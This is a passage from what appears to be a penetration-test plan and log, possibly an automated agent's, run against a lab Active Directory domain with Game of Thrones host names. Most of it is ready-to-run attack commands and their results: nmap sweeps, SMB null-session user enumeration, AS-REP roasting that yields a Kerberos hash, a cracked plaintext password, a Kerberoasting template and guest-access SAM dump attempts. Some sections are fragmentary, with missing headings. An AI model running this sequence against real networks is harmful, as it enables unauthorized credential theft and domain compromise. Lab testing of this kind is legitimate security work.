        - Command: `nmap -sT -p- --min-rate 1000 -oA /root/nmap_scan 192.168.56.0/24 --exclude 192.168.56.1,192.168.56.100,192.168.56.107 -e eth1`
        - Results: The following hosts were found to be live:
            - 192.168.56.10 (sevenkingdoms.local): Likely AD DC/Member. Open ports include 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 5986, 9389, 47001.
            - 192.168.56.11 (winterfell.north.sevenkingdoms.local): Likely AD DC/Member. Open ports include 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 5986, 9389, 47001.
            - 192.168.56.12 (essos.local): Likely AD DC/Member. Open ports include 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985, 5986, 9389, 47001.
            - 192.168.56.22 (castelblack.north.sevenkingdoms.local): SQL Server, SMB, RDP, WinRM. Open ports include 80, 135, 139, 445, 1433, 3389, 5985, 5986, 47001.
            - 192.168.56.23 (braavos.essos.local): SQL Server, SMB, RDP, WinRM. Open ports include 80, 135, 139, 445, 1433, 3389, 5985, 5986, 47001.

    1.2. Attempt to enumerate valid domain users using the OSINT list (`/root/osint_users.txt`).
        - Description: Use the gathered OSINT usernames to identify valid accounts within the domain. This can help narrow down targets for password attacks.
        - Command: `netexec smb 192.168.56.0/24 -u /root/osint_users.txt --no-pass --only-users --exclude-hosts 192.168.56.1,192.168.56.100,192.168.56.107`
        - Results: The command failed due to unrecognized arguments (`--no-pass`, `--only-users`, `--exclude-hosts` are not valid for `netexec smb` in this context). The subsequent command `netexec smb 192.168.56.0/24 -u /root/osint_users.txt` was executed but did not perform user enumeration as intended.
        - Note: A correct method for unauthenticated user enumeration is needed to refine the user list from OSINT. See Task 2.1.

    1.3. Enumerate DNS records via zone transfer.
        - Description: Attempt to perform a DNS zone transfer from the identified Domain Controllers to enumerate hostnames and potentially other network information.
        - Tool: `dig` or `host`
        - Objective: Obtain a list of hostnames and IP addresses within the domain.
        - Targets: Domain Controllers (192.168.56.10, 192.168.56.11, 192.168.56.12).
        - Domains: sevenkingdoms.local, north.sevenkingdoms.local, essos.local.
        - Command: `dig axfr sevenkingdoms.local @192.168.56.10`
        - Results: The task to enumerate DNS records via zone transfer was attempted against the domain controllers 192.168.56.10, 192.168.56.11, and 192.168.56.12 for the domains sevenkingdoms.local, north.sevenkingdoms.local, and essos.local. All attempts to perform a zone transfer using the `dig axfr` command failed with the message "Transfer failed."
        - Key Finding: DNS zone transfers are not permitted from the target domain controllers for the specified domains. This method cannot be used to enumerate hostnames and IP addresses.
        - Status: Non-relevant.
2. User and Credential Enumeration

The response from the server can indicate which usernames are valid. Also attempt enumeration using `impacket-lookupsid` and `enum4linux` if applicable and not previously attempted against these specific targets/domains.
        - Tool: netexec smb, impacket-lookupsid, enum4linux
        - Objective: Identify valid domain users from the `/root/osint_users.txt` list across all identified domains.
        - Targets: 192.168.56.10 (sevenkingdoms.local), 192.168.56.11 (north.sevenkingdoms.local), 192.168.56.12 (essos.local).
        - Users: `/root/osint_users.txt`.
        - Commands:
            - `netexec smb 192.168.56.10 -u /root/osint_users.txt -p ''`
            - `netexec smb 192.168.56.11 -u /root/osint_users.txt -p ''`
            - `netexec smb 192.168.56.12 -u /root/osint_users.txt -p ''`
            - `impacket-lookupsid sevenkingdoms.local/@192.168.56.10` (Attempted in 1.6, failed)
            - `impacket-lookupsid north.sevenkingdoms.local/@192.168.56.11`
            - `impacket-lookupsid essos.local/@192.168.56.12`
            - `enum4linux -a 192.168.56.10` (Attempted in 1.7, failed)
            - `enum4linux -a 192.168.56.11`
            - `enum4linux -a 192.168.56.12`
        - Results: Attempting `netexec smb` with empty password against all three DCs (192.168.56.10, 192.168.56.11, 192.168.56.12) resulted in successful connections indicating null session/guest access is possible, but did not explicitly enumerate valid users from the OSINT list. Previous attempts with `impacket-lookupsid` and `enum4linux` against 192.168.56.10 failed to enumerate users/groups due to access denied, although `impacket-lookupsid` did identify likely valid users from the OSINT list based on responses. The likely valid users identified from the OSINT list via `impacket-lookupsid` against 192.168.56.10 are: `cersei.lannister`, `jaime.lannister`, `joffrey.baratheon`, `renly.baratheon`, `robert.baratheon`, `stannis.baratheon`, `tywin.lannister`. The attempt against 192.168.56.12 confirmed connectivity, OS details, SMB signing/SMBv1 status, and successful connection with an empty password, but no explicit user list. Guest access is possible on 192.168.56.10, 192.168.56.11, and 192.168.56.12 via SMB.

    2.2. Attempt to identify users vulnerable to AS-REP roasting.

        - Tool: impacket-GetNPUsers
        - Objective: Obtain AS-REP hashes for offline cracking.
        - Targets: Domain Controllers identified in the network scan (Task 1.1): 192.168.56.10, 192.168.56.11, 192.168.56.12.
        - Users: Use the OSINT user list (`/root/osint_users.txt`).
        - Domains: sevenkingdoms.local, north.sevenkingdoms.local, essos.local.
        - Commands:
            - `impacket-GetNPUsers sevenkingdoms.local/ -request -usersfile /root/osint_users.txt -dc-ip 192.168.56.10`
            - `impacket-GetNPUsers north.sevenkingdoms.local/ -request -usersfile /root/osint_users.txt -dc-ip 192.168.56.11`
            - `impacket-GetNPUsers essos.local/ -request -usersfile /root/osint_users.txt -dc-ip 192.168.56.12`
        - Results: Execution against 192.168.56.10 identified likely valid domain users from the OSINT list: `cersei.lannister`, `jaime.lannister`, `joffrey.baratheon`, `renly.baratheon`, `robert.baratheon`, `stannis.baratheon`, `tywin.lannister`. None of these users have the `UF_DONT_REQUIRE_PREAUTH` flag set. The attempt against 192.168.56.11 (north.sevenkingdoms.local) did not yield any vulnerable accounts. The attempt against 192.168.56.12 (essos.local) was successful in identifying one user vulnerable to AS-REP roasting and retrieving their hash: `$krb5asrep$23$missandei@ESSOS.LOCAL:49b9fdf7fb61d5ec8b47b5a372d6afa0$`.
        - Status: Completed.
    2.3. Attempt to identify Kerberoastable users.
        - Description: Identify Active Directory user accounts with Service Principal Names (SPNs) that are vulnerable to Kerberoasting. Use any valid domain credentials obtained, such as missandei@ESSOS.LOCAL.
        - Tool: impacket-GetUserSPNs
        - Objective: Obtain Kerberos ticket hashes for SPN accounts, which can be cracked offline to obtain plaintext passwords.
        - Targets: Domain Controllers identified in the network scan (Task 1.1): 192.168.56.10, 192.168.56.11, 192.168.56.12.
        - Credentials: Use any valid domain credentials obtained from the password spraying phase (Task 3.1, 3.2, or 3.3) or other means, such as missandei:fr3edom.
        - Domains: sevenkingdoms.local, north.sevenkingdoms.local, essos.local.
        - Command Template: `impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc_ip>` (Replace <domain>, <username>:<password> with the actual credentials and <dc_ip> with one of the DC IPs).
        - Status: Relevant.

        - Objective: Obtain local user hashes for offline cracking.
        - Targets: 192.168.56.22, 192.168.56.23.

        - Results: The attempt to dump SAM hashes from hosts 192.168.56.22 and 192.168.56.23 using guest access was performed. Guest access was successful on both hosts, but no SAM hashes were obtained.
        - Status: Completed.

            - Command: `netexec smb 192.168.56.11 -u guest -p '' --sam`
